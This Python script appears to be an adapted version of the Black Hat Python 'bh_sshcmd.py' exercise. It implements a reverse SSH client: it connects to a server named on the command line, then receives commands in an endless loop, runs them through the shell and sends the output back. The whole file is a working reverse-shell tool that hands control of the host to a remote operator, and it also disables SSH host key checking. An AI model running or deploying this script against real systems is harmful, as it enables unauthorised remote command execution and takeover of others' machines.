#!/usr/bin/env python3

import threading
import paramiko
import subprocess
import os, pwd # using these in line 16 to get the user's name so the program is portable
import sys # added for command-line use

# this is a modified version of bh_sshcmd.py that supports running commands on Windows clients over SSH
# Normally when using SSH, you use an SSH client to connect to an SSH server, but because Windows doesn't 
# include an SSH server out-of-the-box, we need to reverse this and send commands from our SSH server to the SSH client

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # this allows the client to also support using key files
    #client.load_host_keys('/home/' + pwd.getpwuid(os.getuid())[0] + '/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username = user, password = passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode()) # read the banner
        while True:
            command = ssh_session.recv(1024) # get the command from the SSH server
            try:
                cmd_output = subprocess.check_output(command, shell = True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

# added command line arguments since manually changing the code every time would be annoying
# however, since we always want to send 'ClientConnected', I left it as an unchangeable argument
# the ip address of the server, username of the user running the SSH server on the target machine, and the password of the user in question
serverIp = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

ssh_command(serverIp, username, password, 'ClientConnected')